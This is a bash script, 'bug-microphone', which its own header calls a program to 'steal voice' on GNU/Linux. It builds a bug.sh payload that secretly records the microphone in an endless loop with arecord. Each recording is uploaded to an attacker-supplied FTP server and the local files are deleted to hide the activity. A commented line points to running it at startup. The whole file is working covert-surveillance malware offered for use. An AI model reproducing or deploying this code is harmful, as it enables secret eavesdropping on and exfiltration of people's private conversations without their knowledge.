#!/bin/bash

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# bug-microphone is a program for steal voice in gnu/linux OS.
#
# bug-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# bug-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#


zenity --height=100 --width=300 --icon-name='audio-input-microphone' --info --title="SPY MICROPHONE" --window-icon=bug.png  --text="<span color=\"black\"> Choose the mode of your bug  </span>" --ok-label="Next"  


result="$(zenity --height=1000 --width=2000 --forms --title="SPY MICROPHONE" --text="Choose the mode of your bug 1. Time record 2. Ftp Settings" --add-entry="TIME:REC" --add-entry="FTP:HOST" --add-entry="FTP:USER" --add-entry="FTP:PASS")"

     timeout="$(echo "$result"| cut -d '|' -f 1)"
     host="$(echo "$result"| cut -d '|' -f 2)"
     user="$(echo "$result"| cut -d '|' -f 3)"
     pass="$(echo "$result"| cut -d '|' -f 4)"      


cat <<EOF >bug.sh
#!/bin/bash

c=1

while [ \$c > 0 ]

do

  max=1440

 for counter in \`seq 1 \$max\`

  do

    timeout $timeout arecord -vv bugs\$counter


HOST="$host"
USER="$user"
PASSWD="$pass"
FILE="bugs\$counter"


ftp -n \$HOST <<END_SCRIPT
quote USER \$USER
quote PASS \$PASSWD
passive
put \$FILE \$HOST/\$FILE.wav
quit
END_SCRIPT

 find -type f -name '*bugs*' -delete

 done

 exit 1

done

EOF


chmod -R 777 bug.sh

#chmod +x /etc/init.d/bug.sh

sleep 2|tee >(zenity --height=200 --width=350 --progress --pulsate --no-cancel --auto-close --text="Please wait...")

